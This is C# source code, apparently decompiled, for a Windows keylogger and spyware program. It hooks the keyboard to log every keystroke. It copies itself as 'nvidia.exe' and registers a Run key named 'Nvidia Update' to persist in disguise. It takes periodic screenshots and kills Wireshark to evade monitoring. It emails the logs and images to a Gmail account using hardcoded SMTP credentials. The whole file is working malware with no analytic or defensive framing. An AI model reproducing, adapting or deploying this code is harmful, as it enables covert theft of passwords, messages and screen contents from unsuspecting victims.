using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

namespace hieugavkl;

internal class Program
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 256;

	public static int Pictnr = 1;

	private static LowLevelKeyboardProc _proc = HookCallback;

	private static IntPtr _hookID = IntPtr.Zero;

	public static string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "updatelogs.data");

	public static byte caps = 0;

	public static byte shift = 0;

	public static byte failed = 0;

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	private static void Main(string[] args)
	{
		_hookID = SetHook(_proc);
		startup();
		Timer timer = new Timer();
		timer.Elapsed += OnTimedEvent;
		timer.AutoReset = true;
		timer.Interval = 300000.0;
		timer.Start();
		Timer timer2 = new Timer();
		timer2.Elapsed += Takescreen;
		timer2.AutoReset = true;
		timer2.Interval = 60000.0;
		timer2.Start();
		Application.Run();
		GC.KeepAlive(timer);
		GC.KeepAlive(timer2);
		UnhookWindowsHookEx(_hookID);
	}

	public static void startup()
	{
		string sourceFileName = Application.get_ExecutablePath().ToString();
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\";
		path = Path.Combine(path, "nvidia.exe");
		try
		{
			File.Copy(sourceFileName, path, overwrite: false);
			sourceFileName = path;
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("Nvidia Update") == null)
			{
				registryKey.SetValue("Nvidia Update", path);
			}
			registryKey.Close();
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("Nvidia Update") == null)
			{
				registryKey.SetValue("Nvidia Update", path);
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	public static void Takescreen(object sender, EventArgs e)
	{
		Pictnr++;
		Random random = new Random();
		string text = random.Next(10000).ToString();
		string text2 = Environment.MachineName + Pictnr + "_" + text + ".png";
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string text3 = folderPath + "\\" + text2;
		Rectangle bounds = Screen.GetBounds(Screen.GetBounds(Point.Empty));
		try
		{
			ScreenShot.CaptureImage(Point.Empty, Point.Empty, bounds, text3);
		}
		catch
		{
		}
		try
		{
			MailMessage mailMessage = new MailMessage();
			mailMessage.To.Add("goku.maxstrength@gmail.com");
			mailMessage.From = new MailAddress("goku.maxstrength@gmail.com", "goku.maxstrength", Encoding.UTF8);
			mailMessage.Subject = Environment.MachineName.ToString();
			mailMessage.SubjectEncoding = Encoding.UTF8;
			mailMessage.Body = "Hieu ga vkl";
			mailMessage.BodyEncoding = Encoding.UTF8;
			mailMessage.IsBodyHtml = false;
			mailMessage.Priority = MailPriority.High;
			SmtpClient smtpClient = new SmtpClient();
			smtpClient.Credentials = new NetworkCredential("goku.maxstrength@gmail.com", "goku.maxspeed");
			smtpClient.Port = 587;
			smtpClient.Host = "smtp.gmail.com";
			smtpClient.EnableSsl = true;
			Attachment attachment = new Attachment(text3);
			try
			{
				mailMessage.Attachments.Add(attachment);
			}
			catch
			{
			}
			try
			{
				smtpClient.Send(mailMessage);
				failed = 0;
			}
			catch
			{
				attachment.Dispose();
				failed = 1;
			}
			attachment.Dispose();
			FileInfo fileInfo = new FileInfo(text3);
			fileInfo.Delete();
		}
		catch
		{
		}
	}

	public static void OnTimedEvent(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.MainWindowTitle.Contains("Wireshark"))
			{
				process.Kill();
			}
		}
		MailMessage mailMessage = new MailMessage();
		mailMessage.To.Add("goku.maxstrength@gmail.com");
		mailMessage.From = new MailAddress("goku.maxstrength@gmail.com", "goku.maxstrength", Encoding.UTF8);
		mailMessage.Subject = Environment.MachineName.ToString();
		mailMessage.SubjectEncoding = Encoding.UTF8;
		mailMessage.Body = "Hieu ga vkl";
		mailMessage.BodyEncoding = Encoding.UTF8;
		mailMessage.IsBodyHtml = false;
		mailMessage.Priority = MailPriority.High;
		SmtpClient smtpClient = new SmtpClient();
		smtpClient.Credentials = new NetworkCredential("goku.maxstrength@gmail.com", "goku.maxspeed");
		smtpClient.Port = 587;
		smtpClient.Host = "smtp.gmail.com";
		smtpClient.EnableSsl = true;
		Attachment attachment = new Attachment(path);
		try
		{
			mailMessage.Attachments.Add(attachment);
		}
		catch
		{
		}
		try
		{
			smtpClient.Send(mailMessage);
			failed = 0;
		}
		catch
		{
			attachment.Dispose();
			failed = 1;
		}
		attachment.Dispose();
		if (failed == 0)
		{
			File.WriteAllText(path, "");
		}
		failed = 0;
	}

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		using Process process = Process.GetCurrentProcess();
		using ProcessModule processModule = process.MainModule;
		return SetWindowsHookEx(13, proc, GetModuleHandle(processModule.ModuleName), 0u);
	}

	private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Invalid comparison between I4 and Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Invalid comparison between Unknown and I4
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Invalid comparison between Unknown and I4
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Expected I4, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Invalid comparison between Unknown and I4
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Invalid comparison between Unknown and I4
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Invalid comparison between Unknown and I4
		//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ee: Invalid comparison between Unknown and I4
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0125: Expected I4, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Unknown result type (might be due to invalid IL or missing references)
		//IL_013b: Expected I4, but got Unknown
		//IL_0302: Unknown result type (might be due to invalid IL or missing references)
		//IL_0309: Unknown result type (might be due to invalid IL or missing references)
		//IL_0327: Expected I4, but got Unknown
		//IL_0327: Unknown result type (might be due to invalid IL or missing references)
		//IL_032e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0350: Expected I4, but got Unknown
		//IL_0350: Unknown result type (might be due to invalid IL or missing references)
		//IL_0357: Unknown result type (might be due to invalid IL or missing references)
		//IL_036d: Expected I4, but got Unknown
		StreamWriter streamWriter;
		int num;
		if (nCode >= 0 && wParam == (IntPtr)256)
		{
			streamWriter = File.AppendText(path);
			num = Marshal.ReadInt32(lParam);
			if (65536 == (int)Control.get_ModifierKeys())
			{
				shift = 1;
			}
			Keys val = (Keys)num;
			if ((int)val <= 32)
			{
				if ((int)val <= 13)
				{
					switch (val - 8)
					{
					case 0:
						goto IL_0086;
					case 1:
						goto IL_0096;
					}
					if ((int)val != 13)
					{
						goto IL_036d;
					}
					streamWriter.Write("\n");
				}
				else if ((int)val != 20)
				{
					if ((int)val != 32)
					{
						goto IL_036d;
					}
					streamWriter.Write(" ");
				}
				else if (caps == 0)
				{
					caps = 1;
				}
				else
				{
					caps = 0;
				}
				goto IL_05f3;
			}
			if ((int)val <= 93)
			{
				switch (val - 48)
				{
				case 0:
					goto IL_0140;
				case 1:
					goto IL_016d;
				case 2:
					goto IL_019a;
				case 3:
					goto IL_01c7;
				case 4:
					goto IL_01f4;
				case 5:
					goto IL_0221;
				case 6:
					goto IL_024e;
				case 7:
					goto IL_027b;
				case 8:
					goto IL_02a8;
				case 9:
					goto IL_02d5;
				}
				switch (val - 91)
				{
				case 0:
				case 1:
				case 2:
					goto IL_05e8;
				}
			}
			else
			{
				switch (val - 160)
				{
				case 0:
				case 1:
				case 2:
				case 3:
				case 4:
				case 5:
					goto IL_05e8;
				}
				switch (val - 186)
				{
				case 0:
					goto IL_04bf;
				case 1:
					goto IL_04ec;
				case 2:
					goto IL_0519;
				case 3:
					goto IL_0546;
				case 4:
					goto IL_0573;
				case 5:
					goto IL_059a;
				case 6:
					goto IL_05c1;
				}
				switch (val - 219)
				{
				case 0:
					goto IL_042b;
				case 1:
					goto IL_0458;
				case 2:
					goto IL_0468;
				case 3:
					goto IL_0495;
				}
			}
			goto IL_036d;
		}
		goto IL_0605;
		IL_024e:
		if (shift == 0)
		{
			streamWriter.Write("6");
		}
		else
		{
			streamWriter.Write("^");
		}
		goto IL_05f3;
		IL_042b:
		if (shift == 0)
		{
			streamWriter.Write("[");
		}
		else
		{
			streamWriter.Write("{");
		}
		goto IL_05f3;
		IL_0221:
		if (shift == 0)
		{
			streamWriter.Write("5");
		}
		else
		{
			streamWriter.Write("%");
		}
		goto IL_05f3;
		IL_05c1:
		if (shift == 0)
		{
			streamWriter.Write("`");
		}
		else
		{
			streamWriter.Write("~");
		}
		goto IL_05f3;
		IL_05f3:
		shift = 0;
		streamWriter.Close();
		streamWriter.Dispose();
		goto IL_0605;
		IL_01f4:
		if (shift == 0)
		{
			streamWriter.Write("4");
		}
		else
		{
			streamWriter.Write("$");
		}
		goto IL_05f3;
		IL_0096:
		streamWriter.Write("TAB");
		goto IL_05f3;
		IL_0086:
		streamWriter.Write("<<");
		goto IL_05f3;
		IL_04ec:
		if (shift == 0)
		{
			streamWriter.Write("=");
		}
		else
		{
			streamWriter.Write("+");
		}
		goto IL_05f3;
		IL_01c7:
		if (shift == 0)
		{
			streamWriter.Write("3");
		}
		else
		{
			streamWriter.Write("#");
		}
		goto IL_05f3;
		IL_059a:
		if (shift == 0)
		{
			streamWriter.Write("/");
		}
		else
		{
			streamWriter.Write("?");
		}
		goto IL_05f3;
		IL_0605:
		return CallNextHookEx(_hookID, nCode, wParam, lParam);
		IL_019a:
		if (shift == 0)
		{
			streamWriter.Write("2");
		}
		else
		{
			streamWriter.Write("@");
		}
		goto IL_05f3;
		IL_0573:
		if (shift == 0)
		{
			streamWriter.Write(".");
		}
		else
		{
			streamWriter.Write(">");
		}
		goto IL_05f3;
		IL_0468:
		if (shift == 0)
		{
			streamWriter.Write("]");
		}
		else
		{
			streamWriter.Write("}");
		}
		goto IL_05f3;
		IL_036d:
		if (shift == 0 && caps == 0)
		{
			streamWriter.Write(((object)(Keys)num).ToString()!.ToLower());
		}
		if (shift == 1 && caps == 0)
		{
			streamWriter.Write(((object)(Keys)num).ToString()!.ToUpper());
		}
		if (shift == 0 && caps == 1)
		{
			streamWriter.Write(((object)(Keys)num).ToString()!.ToUpper());
		}
		if (shift == 1 && caps == 1)
		{
			streamWriter.Write(((object)(Keys)num).ToString()!.ToLower());
		}
		goto IL_05f3;
		IL_0495:
		if (shift == 0)
		{
			streamWriter.Write("'");
		}
		else
		{
			streamWriter.Write('"');
		}
		goto IL_05f3;
		IL_016d:
		if (shift == 0)
		{
			streamWriter.Write("1");
		}
		else
		{
			streamWriter.Write("!");
		}
		goto IL_05f3;
		IL_02d5:
		if (shift == 0)
		{
			streamWriter.Write("9");
		}
		else
		{
			streamWriter.Write("(");
		}
		goto IL_05f3;
		IL_0140:
		if (shift == 0)
		{
			streamWriter.Write("0");
		}
		else
		{
			streamWriter.Write(")");
		}
		goto IL_05f3;
		IL_0458:
		streamWriter.Write("|");
		goto IL_05f3;
		IL_02a8:
		if (shift == 0)
		{
			streamWriter.Write("8");
		}
		else
		{
			streamWriter.Write("*");
		}
		goto IL_05f3;
		IL_0519:
		if (shift == 0)
		{
			streamWriter.Write(",");
		}
		else
		{
			streamWriter.Write("<");
		}
		goto IL_05f3;
		IL_04bf:
		if (shift == 0)
		{
			streamWriter.Write(";");
		}
		else
		{
			streamWriter.Write(":");
		}
		goto IL_05f3;
		IL_027b:
		if (shift == 0)
		{
			streamWriter.Write("7");
		}
		else
		{
			streamWriter.Write("&");
		}
		goto IL_05f3;
		IL_0546:
		if (shift == 0)
		{
			streamWriter.Write("-");
		}
		else
		{
			streamWriter.Write("_");
		}
		goto IL_05f3;
		IL_05e8:
		streamWriter.Write("");
		goto IL_05f3;
	}
}
